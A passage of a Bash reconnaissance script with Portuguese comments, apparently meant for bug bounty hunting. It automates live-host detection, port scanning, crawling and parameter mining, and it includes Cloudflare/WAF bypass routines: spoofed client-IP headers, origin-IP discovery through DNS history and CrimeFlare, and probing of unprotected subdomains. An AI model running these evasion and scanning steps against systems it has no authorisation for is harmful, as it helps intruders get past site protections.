        curl -s "http://archive.org/wayback/available?url=$domain" 2>/dev/null | \
            jq -r '.archived_snapshots.closest.url' 2>/dev/null >> reports/cloudflare_bypass/wayback_urls.txt || true
    done
    
    log_info "✅ Cloudflare bypass techniques completas"
}

live_host_detection() {
    log_info "Executando httpx para detectar hosts vivos e tecnologias..."
    
    if command -v httpx >/dev/null 2>&1 && [[ -s subs/all_subs.txt ]]; then
        # Verificar suporte a flags
        if httpx --help 2>/dev/null | grep -q '\-rl'; then
            HTTPX_FLAGS="-rl $RATE_LIMIT"
        else
            HTTPX_FLAGS=""
        fi
        
        # Array de User-Agents para rotação
        local USER_AGENTS=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
        )
        local RANDOM_UA="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
        
        # Cloudflare bypass com delays e rotação
        log_info "🔥 Usando User-Agent rotativo e bypass headers para evitar bloqueios..."
        
        httpx -l subs/all_subs.txt -silent -threads "$((CONCURRENCY / 2))" $HTTPX_FLAGS \
              -tech-detect -status-code -title -ip \
              -H "User-Agent: $RANDOM_UA" \
              -H "X-Forwarded-For: 127.0.0.1" \
              -H "X-Originating-IP: 127.0.0.1" \
              -H "X-Remote-IP: 127.0.0.1" \
              -H "X-Remote-Addr: 127.0.0.1" \
              -H "CF-Connecting-IP: 127.0.0.1" \
              -H "True-Client-IP: 127.0.0.1" \
              -H "X-Forwarded-Host: 127.0.0.1" \
              -delay 2s \
              -o alive/httpx_results.txt 2>/dev/null || true
        
        sleep 3  # Delay entre scans
        
        # Saída JSON também com bypass headers e delay
        httpx -l subs/all_subs.txt -silent -json -threads "$((CONCURRENCY / 2))" $HTTPX_FLAGS \
              -tech-detect \
              -H "User-Agent: $RANDOM_UA" \
              -H "X-Forwarded-For: 127.0.0.1" \
              -H "X-Originating-IP: 127.0.0.1" \
              -H "X-Remote-IP: 127.0.0.1" \
              -H "CF-Connecting-IP: 127.0.0.1" \
              -H "True-Client-IP: 127.0.0.1" \
              -delay 2s \
              -o alive/httpx.json 2>/dev/null || true
        
        # Processar resultados
        if [[ -s alive/httpx_results.txt ]]; then
            awk '{print $1}' alive/httpx_results.txt | sed 's/,$//' | sort -u > alive/hosts.txt || true
            cat alive/hosts.txt | sed -E 's@https?://@@' | sed 's@/.*@@' | sort -u > alive/hosts_only.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    live_host_detection
    cloudflare_bypass  # Adicionar bypass do Cloudflare
    waf_detection  # Adicionar detecção de WAF
else
    log_info "DRY-RUN: Pulando detecção de hosts vivos"
    # Criar arquivos mock no modo dry-run
    head -10 subs/all_subs.txt > alive/hosts_only.txt
    sed 's/^/https:\/\//' alive/hosts_only.txt > alive/hosts.txt
fi

LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
log_info "Live hosts: $LIVE_HOSTS"

# Verificar se temos hosts vivos  
if [[ ! -s alive/hosts_only.txt ]]; then
    log_error "Nenhum host vivo encontrado! Continuando com escopo original..."
    cp raw/scope.clean.txt alive/hosts_only.txt
    sed 's/^/https:\/\//' raw/scope.clean.txt > alive/hosts.txt
    LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
fi

send_notification "✅ *FASE 2 COMPLETA*
✅ $LIVE_HOSTS hosts ativos
📊 Taxa de sucesso: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%"

# ============= CLOUDFLARE BYPASS & DETECTION =============
cloudflare_bypass() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "Nenhum host para testar Cloudflare bypass"
        return
    fi
    
    log_info "☁️  Iniciando detecção e bypass do Cloudflare..."
    mkdir -p tech/cloudflare logs/cloudflare
    
    # Função para detectar Cloudflare
    detect_cloudflare() {
        local url="$1"
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Método 1: Check headers
        local cf_headers=$(curl -sI "$url" -m 10 2>/dev/null | grep -iE "cf-ray|cloudflare|__cfduid" || true)
        
        # Método 2: Check DNS
        local cf_ips=$(dig +short "$domain" 2>/dev/null | grep -E "^(104\.(1[6-9]|2[0-9]|3[01])\.|188\.114\.|162\.159\.|172\.(6[4-9]|7[0-9])\.|131\.0\.72\.|141\.101\.|103\.2[12]\.|103\.3[12]\.)" || true)
        
        if [[ -n "$cf_headers" ]] || [[ -n "$cf_ips" ]]; then
            echo "$url" >> tech/cloudflare/cf_protected.txt
            log_info "🛡️  Cloudflare detectado em: $url"
            return 0
        fi
        return 1
    }
    
    # Detectar hosts protegidos pelo Cloudflare
    log_info "Detectando hosts protegidos pelo Cloudflare..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        detect_cloudflare "$url" &
        
        # Limitar paralelismo
        if [[ $(jobs -r | wc -l) -ge "$PARALLEL_HOSTS" ]]; then
            wait -n
        fi
    done < alive/hosts.txt
    wait
    
    # Se nenhum Cloudflare detectado, retornar
    if [[ ! -s tech/cloudflare/cf_protected.txt ]]; then
        log_info "✅ Nenhum Cloudflare detectado"
        return
    fi
    
    local cf_count=$(wc -l < tech/cloudflare/cf_protected.txt | tr -d ' ')
    log_info "🛡️  $cf_count hosts protegidos pelo Cloudflare detectados"
    
    send_notification "☁️ *CLOUDFLARE DETECTION*
🛡️ $cf_count hosts protegidos detectados
🔍 Iniciando bypass techniques..." "true"
    
    # ============= BYPASS TÉCNICAS =============
    
    # Técnica 1: CloudFlair - Encontrar IPs reais via DNS history
    if command -v cloudflair >/dev/null 2>&1; then
        log_info "🔍 Técnica 1: CloudFlair - Buscando IPs reais via DNS history..."
        while IFS= read -r url || [[ -n "$url" ]]; do
            local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
            local safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
            
            timeout 60s cloudflair -o tech/cloudflare/cloudflair_${safe}.txt "$domain" 2>>logs/cloudflare/cloudflair_errors.log || true
        done < tech/cloudflare/cf_protected.txt
        
        # Consolidar IPs reais encontrados
        if ls tech/cloudflare/cloudflair_*.txt >/dev/null 2>&1; then
            cat tech/cloudflare/cloudflair_*.txt | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u > tech/cloudflare/real_ips.txt
            local real_ips=$(wc -l < tech/cloudflare/real_ips.txt | tr -d ' ')
            if [[ "$real_ips" -gt 0 ]]; then
                log_info "✅ CloudFlair encontrou $real_ips IPs reais potenciais!"
                send_notification "🎯 *CLOUDFLARE BYPASS SUCCESS*
📍 CloudFlair encontrou $real_ips IPs reais!
📄 Veja: tech/cloudflare/real_ips.txt" "true"
            fi
        fi
    else
        log_info "💡 CloudFlair não instalado: use 'pipx install cloudflair' (recomendado em Kali/Debian)"
    fi
    
    # Técnica 2: CrimeFlare Database
    log_info "🔍 Técnica 2: Consultando CrimeFlare database..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Buscar em CrimeFlare API
        curl -s "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi" \
            -d "cfS=$domain" 2>/dev/null | \
            grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" >> tech/cloudflare/crimeflare_ips.txt || true
    done < tech/cloudflare/cf_protected.txt
    
    if [[ -s tech/cloudflare/crimeflare_ips.txt ]]; then
        sort -u tech/cloudflare/crimeflare_ips.txt > tech/cloudflare/crimeflare_ips_unique.txt
        local crime_ips=$(wc -l < tech/cloudflare/crimeflare_ips_unique.txt | tr -d ' ')
        log_info "✅ CrimeFlare encontrou $crime_ips IPs potenciais"
    fi
    
    # Técnica 3: DNS History via SecurityTrails/others
    log_info "🔍 Técnica 3: DNS History lookup..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        local safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
        
        # ViewDNS.info history
        curl -s "https://viewdns.info/iphistory/?domain=$domain" 2>/dev/null | \
            grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | \
            grep -v "104\." | grep -v "188\.114" | grep -v "162\.159" >> tech/cloudflare/dns_history_${safe}.txt || true
            
        sleep 1  # Rate limiting cortesia
    done < tech/cloudflare/cf_protected.txt
    
    if ls tech/cloudflare/dns_history_*.txt >/dev/null 2>&1; then
        cat tech/cloudflare/dns_history_*.txt | sort -u > tech/cloudflare/historical_ips.txt
        local hist_ips=$(wc -l < tech/cloudflare/historical_ips.txt | tr -d ' ')
        if [[ "$hist_ips" -gt 0 ]]; then
            log_info "✅ DNS History encontrou $hist_ips IPs históricos"
        fi
    fi
    
    # Técnica 4: Subdomain scanning para encontrar hosts não protegidos
    log_info "🔍 Técnica 4: Buscando subdomínios não protegidos..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Testar subdomínios comuns que podem não estar atrás do CF
        for sub in origin direct ftp mail smtp pop cpanel whm admin dev staging test backup; do
            local test_domain="${sub}.${domain}"
            local test_ip=$(dig +short "$test_domain" 2>/dev/null | head -1 | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" || true)
            
            if [[ -n "$test_ip" ]] && [[ ! "$test_ip" =~ ^104\. ]] && [[ ! "$test_ip" =~ ^188\.114 ]]; then
                echo "$test_domain -> $test_ip" >> tech/cloudflare/unprotected_subs.txt
            fi
        done
    done < tech/cloudflare/cf_protected.txt
    
    if [[ -s tech/cloudflare/unprotected_subs.txt ]]; then
        local unprot=$(wc -l < tech/cloudflare/unprotected_subs.txt | tr -d ' ')
        log_info "✅ Encontrados $unprot subdomínios potencialmente desprotegidos"
    fi
    
    # Consolidar TODOS os IPs encontrados
    cat tech/cloudflare/real_ips.txt \
        tech/cloudflare/crimeflare_ips_unique.txt \
        tech/cloudflare/historical_ips.txt 2>/dev/null | \
        sort -u > tech/cloudflare/all_bypass_ips.txt || true
    
    local total_bypass=$(wc -l < tech/cloudflare/all_bypass_ips.txt 2>/dev/null | tr -d ' ' || echo 0)
    
    # Criar arquivo de bypass headers para uso posterior
    cat > tech/cloudflare/bypass_headers.txt << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
EOF
    
    # Gerar relatório final
    cat > tech/cloudflare/BYPASS_REPORT.txt << EOF
========================================
🛡️  CLOUDFLARE BYPASS REPORT
========================================
📊 Hosts protegidos detectados: $cf_count
🎯 IPs reais encontrados: $total_bypass
📍 Subdomínios desprotegidos: $(wc -l < tech/cloudflare/unprotected_subs.txt 2>/dev/null || echo 0)

📁 Arquivos gerados:
- tech/cloudflare/cf_protected.txt (hosts protegidos)
- tech/cloudflare/all_bypass_ips.txt (IPs reais consolidados)
- tech/cloudflare/unprotected_subs.txt (subdomínios sem CF)
- tech/cloudflare/bypass_headers.txt (headers de bypass)

💡 PRÓXIMOS PASSOS:
1. Teste acesso direto aos IPs: curl -H "Host: domain.com" http://IP
2. Use bypass headers em todas as requisições
3. Configure hosts file: IP domain.com
4. Teste subdomínios desprotegidos primeiro

⚠️  TÉCNICAS DE EVASÃO ATIVAS:
- User-Agent rotation habilitado
- Headers de bypass configurados
- IPs diretos mapeados
- Rate limiting inteligente aplicado

🔐 LEMBRE-SE: Use apenas com autorização!
========================================
EOF
    
    cat tech/cloudflare/BYPASS_REPORT.txt
    
    if [[ "$total_bypass" -gt 0 ]]; then
        send_telegram_status "🎯 *CLOUDFLARE BYPASS COMPLETE*
✅ $total_bypass IPs reais descobertos!
📊 $(wc -l < tech/cloudflare/unprotected_subs.txt 2>/dev/null || echo 0) subdomínios desprotegidos
📄 Relatório: tech/cloudflare/BYPASS_REPORT.txt

💡 Use: curl -H 'Host: domain.com' http://REAL_IP" "true"
    else
        log_info "⚠️  Nenhum IP real encontrado. Considere técnicas manuais."
    fi
}

# ============= FASE 3: SCANNING DE PORTAS CONTROLADO =============
echo ""
echo "========== FASE 3: PORT SCANNING =========="
send_notification "🔍 *FASE 3: PORT SCANNING*
Escaneando portas em $LIVE_HOSTS hosts..."

port_scanning() {
    # ETAPA 1: MASSCAN - Ultra-rápido pre-scan
    if command -v masscan >/dev/null 2>&1 && [[ -s alive/hosts_only.txt ]] && [[ "$DRY_RUN" = "false" ]]; then
        log_info "🚀 ETAPA 1: Executando MASSCAN para descoberta ultra-rápida..."
        mkdir -p ports/masscan
        
        # Verificar se temos IPs ou precisa resolver
        local has_ips=false
        head -1 alive/hosts_only.txt | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' && has_ips=true
        
        if [[ "$has_ips" = "true" ]]; then
            # Scan com rate SEGURO para não derrubar a internet
            log_info "⚠️  Usando rate SEGURO: ${MASSCAN_RATE:-500} pacotes/seg (não vai derrubar sua internet)"
            timeout 45m masscan -p1-65535 \
                --rate "${MASSCAN_RATE:-500}" \
                -iL alive/hosts_only.txt \
                -oL ports/masscan/masscan_results.txt \
                --wait 2 \
                --open 2>/dev/null || true
            
            # Processar resultados do masscan
            if [[ -s ports/masscan/masscan_results.txt ]]; then
                grep "^open" ports/masscan/masscan_results.txt | \
                    awk '{print $4":"$3}' | sort -u > ports/masscan/masscan_ports.txt || true
                
                local masscan_ports=$(wc -l < ports/masscan/masscan_ports.txt 2>/dev/null || echo 0)
                log_info "✅ Masscan encontrou $masscan_ports portas abertas"
            fi
        else
            log_info "🔎 Resolvendo IPs para masscan..."
            awk '{print $1}' alive/hosts_only.txt | xargs -I{} sh -c 'dig +short A {} || true' | \
                grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ports/masscan/ips.txt 2>/dev/null || true
            
            if [[ -s ports/masscan/ips.txt ]]; then
                log_info "⚠️  Usando rate SEGURO: ${MASSCAN_RATE:-500} pacotes/seg"
                timeout 45m masscan -p1-65535 \
                    --rate "${MASSCAN_RATE:-500}" \
                    -iL ports/masscan/ips.txt \
                    -oL ports/masscan/masscan_results.txt \
                    --wait 2 \
                    --open 2>/dev/null || true
            fi
        fi
    fi
    
    # ETAPA 2: NAABU - Verificação e service detection
    if command -v naabu >/dev/null 2>&1 && [[ -s alive/hosts_only.txt ]]; then
        log_info "🔥 ETAPA 2: Executando naabu BRUTAL MODE..."
        
        # Inicia os arrays de flags
        local NAABU_FLAGS=()
        local PORT_ARG=()

        # Adiciona a flag de rate-limit se a versão do naabu suportar
        if naabu --help 2>/dev/null | grep -q '\-rate'; then
            NAABU_FLAGS=(-rate "$RATE_LIMIT")
        fi
        
        # Se temos resultados do masscan, usar apenas essas portas
        if [[ -s ports/masscan/masscan_ports.txt ]]; then
            log_info "📍 Usando portas descobertas pelo masscan para verificação..."
            # Extrair apenas números de portas únicos
            awk -F':' '{print $2}' ports/masscan/masscan_ports.txt | sort -un | tr '\n' ',' | sed 's/,$//' > ports/masscan/ports_only.txt
            PORT_ARG=(-p "$(cat ports/masscan/ports_only.txt)")
        elif [[ "$NAABU_TOP_PORTS" == "full" ]]; then
            # Full scan de todas as 65535 portas
            PORT_ARG=(-p "-")
        else
            # Top ports expandido
            PORT_ARG=(-tp "$NAABU_TOP_PORTS") 
        fi
        
        # Executa o comando naabu COM TRATAMENTO DE ERROS ROBUSTO
        log_info "🔥 Executando naabu... (pode demorar)"
        
        # Primeira tentativa: modo normal
        if timeout "$TIMEOUT_PER_HOST" naabu -list alive/hosts_only.txt \
            "${PORT_ARG[@]}" \
            "${NAABU_FLAGS[@]}" \
            -c "$CONCURRENCY" \
            -retries 2 \
            -warm-up-time 1 \
            -timeout 2000 \
            -verify \
            -no-color \
            -exclude-cdn \
            -silent \
            -o ports/naabu_raw.txt 2>logs/naabu_errors.log; then
            log_info "✅ Naabu completou com sucesso"
        else
            log_info "⚠️ Naabu teve problemas, tentando modo simplificado..."
            # Segunda tentativa: modo simplificado
            timeout "$TIMEOUT_PER_HOST" naabu -list alive/hosts_only.txt \
                "${PORT_ARG[@]}" \
                -c 10 \
                -silent \
                -o ports/naabu_raw.txt 2>>logs/naabu_errors.log || {
                    log_error "❌ Naabu falhou completamente - continuando sem port scan"
                    touch ports/naabu_raw.txt
                }
        fi
            
        if [[ -s ports/naabu_raw.txt ]]; then
            sort -u ports/naabu_raw.txt > ports/naabu.txt || true
            awk -F":" '{print $1}' ports/naabu.txt | sort -u > ports/hosts_with_ports.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    port_scanning
else
    log_info "DRY-RUN: Pulando port scanning"
    touch ports/naabu.txt ports/hosts_with_ports.txt
fi

PORTS_FOUND=$(safe_count ports/naabu.txt)
HOSTS_WITH_PORTS=$(safe_count ports/hosts_with_ports.txt)

send_notification "✅ *FASE 3 COMPLETA*
🚪 $PORTS_FOUND portas abertas
🏠 $HOSTS_WITH_PORTS hosts com portas"


# ============= GETJS COLLECTION IMPLEMENTADA COM DETECÇÃO MELHORADA =============
# Função detect_getjs() movida para o topo do script (antes de check_tools)

getjs_collection() {
    local getjs_bin
    getjs_bin="$(detect_getjs)"

    if [[ -n "$getjs_bin" ]] && [[ -s alive/hosts.txt ]]; then
        # Verificar suporte às flags (precisamos de -url)
        if "$getjs_bin" -h 2>&1 | grep -q '\-url'; then
            log_info "Executando getJS ($getjs_bin) para extrair fontes JS..."
            mkdir -p js/getjs logs

            local processed=0
            local max_hosts=20

            head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
                processed=$((processed + 1))
                safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
                log_info "[getJS $processed/$max_hosts] Processando: $url"

                tmp_err="$(mktemp)"
                if timeout 120s "$getjs_bin" \
                    -complete \
                    -threads 3 \
                    -timeout 30s \
                    -output "js/getjs/getjs_${safe}.txt" \
                    -url "$url" 2>"$tmp_err"; then
                    if [[ -s "js/getjs/getjs_${safe}.txt" ]]; then
                        grep -E "\.js(\?|$)" "js/getjs/getjs_${safe}.txt" 2>/dev/null >> js/js_urls_getjs.txt || true
                    fi
                else
                    echo "[$(date '+%H:%M:%S')] getJS error url=$url exit=$? $(tail -n 2 "$tmp_err" | tr '\n' ' ')" >> logs/getjs_errors.log
                    rm -f "js/getjs/getjs_${safe}.txt" 2>/dev/null || true
                fi
                rm -f "$tmp_err" 2>/dev/null || true
            done

            if [[ -s js/js_urls_getjs.txt ]]; then
                # Mesclar e deduplicar com outras fontes
                if [[ -s js/js_urls_raw.txt ]]; then
                    cat js/js_urls_getjs.txt >> js/js_urls_raw.txt
                else
                    cp js/js_urls_getjs.txt js/js_urls_raw.txt
                fi
                sort -u js/js_urls_raw.txt -o js/js_urls_raw.txt
            fi

            log_info "getJS collection finalizada."
        else
            log_info "getJS detectado, mas flags não suportadas (sem '-url'); pulando com fallback."
        fi
    else
        log_info "getJS não disponível ou nenhum host para processar."
        : > js/js_urls_getjs.txt
    fi
}

# ============= FASE 4: CRAWLING E COLETA DE URLs APRIMORADA =============
echo ""
echo "========== FASE 4: CRAWLING & URL COLLECTION =========="
send_notification "🕷️ *FASE 4: URL CRAWLING*
Coletando URLs com múltiplas ferramentas..."

url_collection() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_error "Nenhum host vivo para fazer crawling!"
        touch urls/all_urls_raw.txt urls/with_params.txt js/js_urls_raw.txt
        return
    fi
    
    # GAU
    if command -v gau >/dev/null 2>&1; then
        log_info "Executando gau..."
        mkdir -p urls/gau
        cat alive/hosts_only.txt | head -20 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'domain="{}"; timeout 60s gau "$domain" 2>/dev/null || true' > urls/gau.txt || true
    fi
    
    # Waybackurls
    if command -v waybackurls >/dev/null 2>&1; then
        log_info "Executando waybackurls..."
        timeout 10m cat alive/hosts_only.txt | head -10 | while read host; do
            echo "$host" | timeout 30s waybackurls 2>/dev/null || true
        done > urls/wayback.txt || true
    fi
    
    # Hakrawler
    if command -v hakrawler >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando hakrawler..."
        cat alive/hosts.txt | head -10 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'timeout 45s echo {} | hakrawler -d '"$MAX_CRAWL_DEPTH"' -subs -t 10 2>/dev/null || true' >> urls/hakrawler.txt || true
    fi
    
    # Katana com CRAWLING PROFUNDO
    if command -v katana >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando katana com crawling profundo..."
        mkdir -p urls/katana
        cat alive/hosts.txt | head -10 | while read -r host; do
            safe=$(echo "$host" | sed 's/[^a-zA-Z0-9]/_/g')
            timeout 180s katana -u "$host" \
                -d 10 \
                -jc \
                -aff \
                -fx \
                -retry 3 \
                -timeout 30 \
                -c 50 \
                -rl 500 \
                -silent \
                -o "urls/katana/katana_${safe}.txt" 2>/dev/null || true
        done
        cat urls/katana/*.txt 2>/dev/null >> urls/katana.txt || true
    fi
    
    # FFUF - REMOVIDO (bruteforce não é recomendado em bug bounty)
    # Directory bruteforcing pode gerar tráfego excessivo e ser considerado intrusivo
    # Para descoberta de diretórios, use ferramentas passivas como waybackurls, gau, etc.
    log_info "⚠️  FFUF bruteforce DESABILITADO (contra princípios de bug bounty ético)"
    
    # Gospider (se disponível)
    if command -v gospider >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando gospider..."
        cat alive/hosts.txt | head -5 | \
        xargs -P "$PARALLEL_HOSTS" -I{} timeout 60s gospider -s {} -d "$MAX_CRAWL_DEPTH" -c 10 -t 20 2>/dev/null | \
        grep -Eo 'https?://[^[:space:]]+' >> urls/gospider.txt || true
    fi
}

url_collection

# Merge e limpar URLs coletadas
cat urls/*.txt 2>/dev/null | grep -E "https?://" | sort -u > urls/all_urls_raw.txt || true

# Extrair URLs parametrizadas
grep -E "\?" urls/all_urls_raw.txt | sort -u > urls/with_params.txt || true

# Extrair arquivos JS
grep -E "\.js(\?|$)" urls/all_urls_raw.txt | sed -E 's#\?.*##' | sort -u > js/js_urls_raw.txt || true

# Extrair endpoints de API
grep -Ei "/api/|/graphql|/v[0-9]+/|\.json|\.asmx" urls/all_urls_raw.txt > apis/api_endpoints.txt 2>/dev/null || true

# Integrar getJS (se disponível) antes de contar/relatar
getjs_collection

TOTAL_URLS=$(safe_count urls/all_urls_raw.txt)
PARAM_URLS=$(safe_count urls/with_params.txt)
JS_FILES=$(safe_count js/js_urls_raw.txt)
API_ENDPOINTS=$(safe_count apis/api_endpoints.txt)

send_notification "✅ *FASE 4 COMPLETA*
🔗 $TOTAL_URLS URLs coletadas
🎯 $PARAM_URLS com parâmetros
📜 $JS_FILES arquivos JavaScript
🔌 $API_ENDPOINTS endpoints de API"

# ============= DOWNLOAD DE ARQUIVOS JS CORRIGIDO =============
download_js_files() {
    if [[ "$SAVE_JS" = true ]] && [[ -s js/js_urls_raw.txt ]]; then
        log_info "Baixando arquivos JS com timeout e fallback..."

        mkdir -p js/downloads logs
        : > logs/js_download_errors.log
        local downloaded=0
        local max_files="${MAX_JS_FILES}"
        local timeout_per_file="${TIMEOUT_PER_CALL}"

        # Detectar downloaders disponíveis (ordem de preferência: aria2c, wget, curl)
        local candidates=()
        if command -v aria2c >/dev/null 2>&1; then candidates+=("aria2c"); fi
        if command -v wget >/dev/null 2>&1; then candidates+=("wget"); fi
        if command -v curl >/dev/null 2>&1; then candidates+=("curl"); fi
        if [[ ${#candidates[@]} -eq 0 ]]; then
            log_error "Nenhum downloader disponível (aria2c/wget/curl)"
            return 1
        fi

        log_info "Downloaders disponíveis: ${candidates[*]} (ordem de fallback)"

        while IFS= read -r line || [[ -n "$line" ]]; do
            [[ $downloaded -ge $max_files ]] && break
            # Sanitizar URL (remover CR e espaços)
            js_url="${line//$'\r'/}"
            js_url="$(echo "$js_url" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
            [[ -z "$js_url" ]] && continue

            # Nome seguro para arquivo
            safe_name=$(echo "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-80)
            outfile="js/downloads/js_${downloaded}_${safe_name}.js"

            log_info "[JS $((downloaded+1))/$max_files] Baixando: $js_url"

            local success=false
            for dl in "${candidates[@]}"; do
                tmp_err="$(mktemp)"
                case "$dl" in
                    aria2c)
                        if timeout "$timeout_per_file" aria2c -x 1 -s 1 --max-connection-per-server=1 --timeout=25 -q -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    wget)
                        if timeout "$timeout_per_file" wget --timeout=25 --tries=1 --user-agent="$USER_AGENT" -q -O "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    curl)
                        if timeout "$timeout_per_file" curl -sS -L -f -m 25 --connect-timeout 10 -A "$USER_AGENT" -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                esac
                if [[ $exit_code -eq 0 && -s "$outfile" ]]; then
                    success=true
                    rm -f "$tmp_err"
                    break
                else
                    err_snip="$(tail -n 2 "$tmp_err" | tr '\n' ' ')"
                    echo "[$(date '+%H:%M:%S')] downloader=$dl url=$js_url exit=$exit_code error=${err_snip}" >> logs/js_download_errors.log
                    rm -f "$outfile" 2>/dev/null || true
                    rm -f "$tmp_err"
                fi
            done

            if [[ "$success" = true ]]; then
                downloaded=$((downloaded + 1))
            fi

            # Pequena pausa para evitar sobrecarga
            sleep 0.1
        done < js/js_urls_raw.txt

        # Contar arquivos baixados com sucesso (não vazios)
        JS_DOWNLOADED=$(find js/downloads -type f -name "*.js" -size +0c 2>/dev/null | wc -l | tr -d ' ')
        total_files=$(find js/downloads -type f -name "*.js" 2>/dev/null | wc -l | tr -d ' ')
        
        # Limpar arquivos vazios
        find js/downloads -type f -empty -delete 2>/dev/null || true
        
        log_info "Download completo: $JS_DOWNLOADED/$total_files arquivos JS válidos"
        
        # Log de estatísticas
        if [[ -s logs/js_download_errors.log ]]; then
            errors=$(wc -l < logs/js_download_errors.log)
            log_info "Erros de download: $errors (veja logs/js_download_errors.log)"
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    download_js_files
else
    log_info "DRY-RUN: Pulando download de arquivos JS"
    JS_DOWNLOADED=0
fi

# ============= ADVANCED PENTESTER FUNCTIONS FROM SCRIPT2 =============

# ============= ADVANCED PARAMETER DISCOVERY (PENTESTER GRADE) =============
advanced_parameter_discovery() {
  log_info "========== ADVANCED PARAMETER MINING =========="
  
  if [[ ! -s alive/hosts.txt ]]; then
    log_warn "Sem hosts vivos. Pulando parameter discovery."
    return
  fi
  
  mkdir -p params apis
  
  # 1. Arjun - Deep parameter discovery
  log_info "🔍 Arjun - Deep parameter mining (wordlist expandida)..."
  if command -v arjun &>/dev/null; then
    cat alive/hosts.txt | head -n 50 | while IFS= read -r url || [[ -n "$url" ]]; do
      safe=$(echo "$url" | md5sum | cut -d' ' -f1)
      timeout 300 arjun -u "$url" \
        --stable \
        -t $(($CONCURRENCY / 2)) \
        -d 5 \
        --passive \
        -oT "params/arjun_$safe.txt" \
        2>/dev/null || true
    done
    find params -name "arjun_*.txt" -exec cat {} \; | sort -u > params/all_params.txt
  fi
  
  # 2. ParamSpider - Historical parameter mining
  log_info "🕷️  ParamSpider - Mining from archives..."
  if command -v paramspider &>/dev/null && [[ -s raw/scope.clean.txt ]]; then
    head -n 10 raw/scope.clean.txt | while read -r domain; do
      timeout 180 paramspider -d "$domain" \
        --exclude woff,css,png,svg,jpg,jpeg,gif,ico \
        --level high \
        --output "params/paramspider_$domain.txt" 2>/dev/null || true
    done
  fi
  
  # 3. JS Parameter Mining (Regex avançado)
  log_info "⚡ Deep JS parameter extraction..."
  if [[ -d js/downloads ]]; then
    find js/downloads -type f -name "*.js" | while read -r jsfile; do
      # Query parameters
      grep -oP '(?<=[\?&])[a-zA-Z0-9_-]+(?==)' "$jsfile" 2>/dev/null || true
      
      # JSON keys (potenciais parâmetros API)
      grep -oP '"\K[a-zA-Z0-9_-]+(?=":\s*["\[\{])' "$jsfile" 2>/dev/null || true
      
      # FormData parameters
      grep -oP 'FormData.*?\.append\(["\x27]([^"\x27]+)' "$jsfile" 2>/dev/null | cut -d'"' -f2 || true
      
      # Ajax/Fetch parameters
      grep -oP '(data|params):\s*\{\s*["\x27]([^"\x27]+)' "$jsfile" 2>/dev/null | grep -oP '["\x27]\K[^"\x27]+' || true
    done | sort -u > params/js_params_deep.txt
  fi
  
  # 4. API Endpoint Discovery from JS
  log_info "🔌 Extracting API endpoints from JavaScript..."
  if [[ -d js/downloads ]]; then
    find js/downloads -type f -name "*.js" | while read -r jsfile; do
      # REST API patterns
